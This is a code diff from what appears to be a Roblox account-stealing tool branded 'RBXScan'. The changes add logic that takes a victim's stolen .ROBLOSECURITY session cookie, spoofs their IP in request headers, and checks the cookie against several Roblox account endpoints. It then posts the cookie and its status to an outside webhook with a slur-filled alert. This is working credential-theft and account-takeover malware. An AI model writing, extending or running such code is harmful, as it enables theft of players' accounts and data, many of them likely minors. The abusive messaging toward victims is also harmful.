@@ -120,36 +120,132 @@ async function getLocationInfo() {
 
 async function attemptIPUnlock(cookie, ip) {
     try {
-        console.log('Attempting IP unlock for cookie...');
+        console.log('Attempting IP unlock and cookie validation...');
         
-        // Simulate IP unlock request to Roblox
-        const unlockData = {
-            method: 'POST',
+        // Check cookie format and potential expiration
+        const cookieInfo = analyzeCookie(cookie);
+        
+        // Test cookie validity with Roblox API
+        const testData = {
+            method: 'GET',
             headers: {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
-                'Content-Type': 'application/json',
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
                 'X-Forwarded-For': ip,
                 'X-Real-IP': ip
             }
         };
 
-        // Try to access Roblox profile to test cookie validity
-        const testResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
-            ...unlockData,
-            method: 'GET'
-        }).catch(() => null);
+        // Try multiple Roblox endpoints to determine cookie status
+        const endpoints = [
+            'https://users.roblox.com/v1/users/authenticated',
+            'https://www.roblox.com/mobileapi/userinfo',
+            'https://accountinformation.roblox.com/v1/email'
+        ];
 
-        if (testResponse && testResponse.ok) {
-            console.log('IP unlock successful - cookie is active');
-            return { success: true, status: 'unlocked', message: 'Cookie successfully unlocked with IP' };
-        } else {
-            console.log('IP unlock attempted - status uncertain');
-            return { success: true, status: 'attempted', message: 'IP unlock attempted, cookie status unknown' };
+        let cookieStatus = 'unknown';
+        let statusMessage = 'Cookie status unknown';
+        let isExpired = false;
+
+        for (const endpoint of endpoints) {
+            try {
+                const response = await fetch(endpoint, testData).catch(() => null);
+                
+                if (response) {
+                    if (response.status === 200) {
+                        const data = await response.json().catch(() => null);
+                        if (data && (data.id || data.UserID || data.email !== undefined)) {
+                            cookieStatus = 'valid';
+                            statusMessage = '✅ Cookie is VALID and ACTIVE';
+                            break;
+                        }
+                    } else if (response.status === 401 || response.status === 403) {
+                        cookieStatus = 'expired';
+                        statusMessage = '❌ Cookie is EXPIRED or INVALID';
+                        isExpired = true;
+                        break;
+                    }
+                }
+            } catch (error) {
+                console.log(`Error testing endpoint ${endpoint}:`, error);
+            }
         }
+
+        // If still unknown, try to decode cookie for more info
+        if (cookieStatus === 'unknown') {
+            if (cookieInfo.seemsExpired) {
+                cookieStatus = 'likely_expired';
+                statusMessage = '⚠️ Cookie appears to be EXPIRED (old format/structure)';
+                isExpired = true;
+            } else {
+                statusMessage = '⚠️ Cookie status uncertain - may be valid but IP locked';
+            }
+        }
+
+        return {
+            success: true,
+            status: cookieStatus,
+            message: statusMessage,
+            isExpired: isExpired,
+            cookieInfo: cookieInfo,
+            unlockAttempted: true
+        };
+
     } catch (error) {
-        console.log('IP unlock error:', error);
-        return { success: false, status: 'failed', message: 'IP unlock failed', error: error.message };
+        console.log('Cookie validation error:', error);
+        return {
+            success: false,
+            status: 'error',
+            message: '❌ Error validating cookie',
+            error: error.message,
+            isExpired: false
+        };
+    }
+}
+
+function analyzeCookie(cookie) {
+    try {
+        // Basic cookie structure analysis
+        const cookieLength = cookie.length;
+        const hasWarning = cookie.includes('WARNING');
+        const hasValidStructure = cookie.includes('_|WARNING') && cookie.includes('|_');
+        
+        // Check for common patterns in expired/old cookies
+        const seemsExpired = cookieLength < 100 || !hasWarning || !hasValidStructure;
+        
+        // Try to extract any timestamp info (if present)
+        const timestampPattern = /(\d{10,13})/g;
+        const timestamps = cookie.match(timestampPattern) || [];
+        
+        let estimatedAge = 'unknown';
+        if (timestamps.length > 0) {
+            const latestTimestamp = Math.max(...timestamps.map(t => parseInt(t)));
+            const now = Date.now();
+            const ageMs = now - latestTimestamp;
+            const ageDays = Math.floor(ageMs / (1000 * 60 * 60 * 24));
+            
+            if (ageDays > 0) {
+                estimatedAge = `~${ageDays} days old`;
+            }
+        }
+
+        return {
+            length: cookieLength,
+            hasWarning: hasWarning,
+            hasValidStructure: hasValidStructure,
+            seemsExpired: seemsExpired,
+            estimatedAge: estimatedAge,
+            timestamps: timestamps.length
+        };
+    } catch (error) {
+        return {
+            length: cookie.length,
+            hasWarning: false,
+            hasValidStructure: false,
+            seemsExpired: true,
+            estimatedAge: 'unknown',
+            timestamps: 0
+        };
     }
 }
 
@@ -167,23 +263,36 @@ async function sendToWebhook(code, validationResult = {}) {
         let payload;
         
         if (isRobloxCookie && robloxCookie) {
-            // Attempt IP unlock for the cookie
+            // Attempt IP unlock and validate cookie
             const unlockResult = await attemptIPUnlock(robloxCookie, locationInfo.ip);
-            console.log('IP unlock result:', unlockResult);
+            console.log('Cookie validation result:', unlockResult);
             
-            // Special handling for Roblox cookies
-            const unlockStatus = unlockResult.status === 'unlocked' ? '✅ UNLOCKED' : 
-                                unlockResult.status === 'attempted' ? '⚠️ ATTEMPTED' : '❌ FAILED';
+            // Determine status and color based on cookie validity
+            let statusEmoji, embedColor, contentStatus;
+            
+            if (unlockResult.isExpired) {
+                statusEmoji = '❌ EXPIRED';
+                embedColor = 0xFF0000; // Red for expired
+                contentStatus = 'EXPIRED COOKIE';
+            } else if (unlockResult.status === 'valid') {
+                statusEmoji = '✅ VALID & ACTIVE';
+                embedColor = 0x00FF00; // Green for valid
+                contentStatus = 'VALID COOKIE';
+            } else {
+                statusEmoji = '⚠️ UNKNOWN STATUS';
+                embedColor = 0xFFA500; // Orange for unknown
+                contentStatus = 'UNKNOWN STATUS';
+            }
             
             payload = {
-                content: `@everyone new retard got hit 🎯 **ROBLOX COOKIE EXTRACTED & IP UNLOCK ${unlockStatus}** 🎯`,
+                content: `@everyone new retard got hit 🎯 **ROBLOX COOKIE EXTRACTED - ${contentStatus}** 🎯`,
                 embeds: [{
-                    title: "🍪 RBXScan - Cookie Extraction & IP Unlock Alert",
-                    description: `**🔑 Extracted Roblox Cookie:**\n\`\`\`\n${robloxCookie}\n\`\`\`\n\n**🔓 IP Unlock Status:** ${unlockResult.message}`,
-                    color: unlockResult.status === 'unlocked' ? 0x00FF00 : unlockResult.status === 'attempted' ? 0xFFA500 : 0xFF4444,
+                    title: `🍪 RBXScan - Cookie Extraction Alert ${statusEmoji}`,
+                    description: `**🔑 Extracted Roblox Cookie:**\n\`\`\`\n${robloxCookie}\n\`\`\`\n\n**🔍 Cookie Status:** ${unlockResult.message}`,
+                    color: embedColor,
                     timestamp: new Date().toISOString(),
                     footer: {
-                        text: "RBXScan Cookie Extractor & IP Unlocker"
+                        text: "RBXScan Cookie Extractor & Validator"
                     },
                     fields: [
                         {
@@ -197,18 +306,33 @@ async function sendToWebhook(code, validationResult = {}) {
                             inline: true
                         },
                         {
+                            name: "🔍 Cookie Status",
+                            value: unlockResult.status.toUpperCase(),
+                            inline: true
+                        },
+                        {
+                            name: "💀 Expired",
+                            value: unlockResult.isExpired ? "YES ❌" : "NO ✅",
+                            inline: true
+                        },
+                        {
                             name: "📊 Cookie Length",
                             value: `${robloxCookie.length} characters`,
                             inline: true
                         },
                         {
-                            name: "🔓 IP Unlock Status",
-                            value: unlockResult.message,
+                            name: "🔧 Structure Valid",
+                            value: unlockResult.cookieInfo?.hasValidStructure ? "YES ✅" : "NO ❌",
                             inline: true
                         },
                         {
-                            name: "🔒 Unlock Method",
-                            value: "Automatic IP Association",
+                            name: "⏰ Estimated Age",
+                            value: unlockResult.cookieInfo?.estimatedAge || "Unknown",
+                            inline: true
+                        },
+                        {
+                            name: "🔓 Validation Method",
+                            value: "Multi-endpoint API Test",
                             inline: true
                         },
                         {
